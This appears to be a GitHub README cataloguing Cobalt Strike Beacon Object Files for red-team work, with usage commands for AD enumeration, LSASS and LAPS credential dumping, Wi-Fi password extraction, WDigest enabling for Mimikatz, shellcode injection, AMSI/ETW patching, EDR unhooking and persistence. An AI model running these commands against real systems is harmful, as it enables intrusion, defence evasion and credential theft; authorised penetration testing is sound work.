# CobaltStrike BOF Collections
Useful Cobalt Strike Beacon Object Files (BOFs) used during red teaming and penetration testing engagements.

---
### Enumeration

- [**TrustedSec Situational Awareness BOF**](https://github.com/trustedsec/CS-Situational-Awareness-BOF)<br />
BOF that provides host enumeration and awarness commands which are more opsec friendly<br />
Example commands include:<br />
```
arp --> List arp tables
ipconfig --> Run ipconfig
ldapsearch [query]
listdns --> Pulls DNS cache
netuser [username] [opt: domain] --> Get info on user account
nslookup [hostname] --> Perform DNS query
tasklist --> Get local running processes
```

- [**Find Objects BOF**](https://github.com/outflanknl/FindObjects-BOF)<br />
Use direct system calls to enumerate processes for specific loaded modules (amsi.dll, clr.dll) or process handles (lsass.exe)<br />
Avoids fork&run<br />
```
FindModule amsi.dll
FindProcHandle lsass.exe
```

- [**BOF Collection**](https://github.com/rvrsh3ll/BOF_Collection)<br />
A set of BOFs useful for enumeration and exploitation. Examples include:<br />
```
inline-execute GetDomainInfo.o --> Get domain info from DC

inline-execute GetClipboard.o --> Prints any text on the user's clipboard

enumwifi --> Enumerate wifi connections
dumpwifi Wifi_Profile_Name --> Dump wifi cleartext credentials

bofportscan 192.168.1.10 3389 --> Port scanner

inline-execute RegistryPersistence.o Install --> Install registry persistence
inline-execute RegistryPersistence.o Remove --> Remove registry persistence
```

- [**whereami**](https://github.com/boku7/whereami)<br />
A "Where Am I" BOF which is a way to run the whoami.exe binary but in an opsec safe way by pulling the info from the current beacon process memory.<br />
Also pulls current environment variables.<br />
```whereami```

- [**RiccardoAncarani BOFs**](https://github.com/RiccardoAncarani/BOFs)<br />
A useful BOF collection to perform various tasks in a safer opsec way.
```
send_shellcode_via_pipe <pipe> <file> --> Send shellcode or any byte via a named pipe
cat <file> --> Read file, supports remote shares
wts_enum_remote_processes <host> --> Enumerate remote processes using WTS APIs
unhook <module>, unhook ntdll.dll --> Use direct syscalls to unhook APIs of a specific DLL (works only on 64-bit beacons)
```

- [**Outflank C2 Tool Collection**](https://github.com/outflanknl/C2-Tool-Collection)<br />
Great list of useful tools converted to BOFs for better opsec.<br />
Tools like add machine account, kerberoast, LAPS password dump, SMB info, LDAP AD spray, and more!
```
AddMachineAccount [*Computername] [Optional Password] --> Create new machine account - requires MachineAccountQuota to create new account
Domaininfo --> Enumerate AD domain
Lapsdump <computername> --> Dump LAPS passwowrds on remote systems within AD (requires elevated privileges on target)
Smbinfo <compuername> --> Get SMB info of remote system
Winver --> Shows the version of Windows that is running on the local system
```

---
### Executing .NET Assemblies

- [**InlineExecute-Assembly**](https://github.com/anthemtotheego/InlineExecute-Assembly)<br />
Perform .NET assembly execution of any .NET executable without any prior modifications required<br />
The BOF also supports several flags to disabling AMSI via in memory patching, disabling and restoring ETW via in memory patching, or customization of the CLR App Domain name to be created<br />
```inlineExecute-Assembly --dotnetassembly /home/Seatbelt.exe --assemblyargs AntiVirus AppLocker --etw --amsi --mailslot totallyLegitMailslot```

- [**inject-assembly**](https://github.com/kyleavery/inject-assembly)<br />
Another alternative .NET executable loader to inject an assembly into a running process<br />
```inject-assembly 0 /home/Rubeus.exe [args...]```

---
### Exploitation

- [**ajpc500 BOFs**](https://github.com/ajpc500/BOFs)<br />
A collection of **very** useful BOFs for various utilities including different techniques of shellcode injection with syscalls, process dumping (LSASS!), and patching ETW for better evasion.<br />
```
etw stop --> Patch etw
syscalls_inject <PID> <listener_name> / syscalls_shinject <PID> <path_to_bin> --> Syscalls shellcode injection
syscalls_spawn <listener> / syscalls_shspawn <path_to_bin> --> Spawn and syscalls injections
static_syscalls_apc_spawn <listener> / static_syscalls_apc_spawn <path_to_bin> --> Spawn and static syscalls shellcode njection (NtQueueApcThread)
static_syscalls_inject <PID> <listener_name> / static_syscalls_shinject <PID> <path_to_bin> --> Static syscalls shellcode injection (NtCreateThreadEx)
static_syscalls_dump <PID> [path_to_output] --> Process dump with syscalls (i.e. Dump LSASS!)
```

- [**MiniDumpWriteDump**](https://github.com/rookuu/BOFs)<br />
Uses static syscalls to dump a process such as LSASS to output file<br />
```minidumpwritedump <PID> <path_of_dmp?>```

- [**SilentLsassDump**](https://github.com/josephkingstone/BOFs-2/)<br />
Uses direct syscalls generated from [https://github.com/outflanknl/InlineWhispers](InlineWhispers)<br />
Dump the LSASS process via the silent process exit mechanism into the C:\Temp directory<br />
```silentLsassDump <LSASS PID>```

- [**Unhook BOF**](https://github.com/rsmudge/unhook-bof)<br />
Created by Raphael Mudge, this BOF will attempt to unhook userland APIs to bypass EDR<br />
Sort of the "hail mary" for attempting to unhook APIs<br />
 ```unhook```

- [**WdToggle**](https://github.com/outflanknl/WdToggle)<br />
Enables WDigest credential caching using direct system calls<br />
Bypasses Windows Credential Guard if enabled<br />
```
inline-execute WdToggle.o --> First enable WdDigest caching
logonpasswords --> Second, wait for users to login and then run Mimikatz to dump their newly cached cleartext passwords
```

- [**TrustedSec CS-Remote-OPs-BOF**](https://github.com/trustedsec/CS-Remote-OPs-BOF)<br />
Great repo of new BOFs from TrustedSec to follow up their SituationalAwareness BOFs.<br />
Includes dumping a process, decrypting Chrome keys, persistence techniques (registry, scheduled tasks, services), and more!
```
adcs_request --> Request an enrollment certificate
procdump --> Dump specified process to output file
reg_set --> Set/create a registry key
sc_create --> Create a new service
schtaskscreate --> Create a new scheduled task
setuserpass --> Set a users password
```

- [**Inject AMSI Bypass**](https://github.com/boku7/injectAmsiBypass)<br />
BOF that bypasses AMSI in a remote process with code injection<br />
```inject-amsiBypass <PID>```

- [**Inject ETW Bypass**](https://github.com/boku7/injectEtwBypass)<br />
Inject ETW Bypass into Remote Process via Syscalls<br />
```injectEtwBypass <PID>```

---
### Miscellaneous

- [**BOF Template**](https://github.com/Cobalt-Strike/bof_template)<br />
Used for creating your very own BOFs!
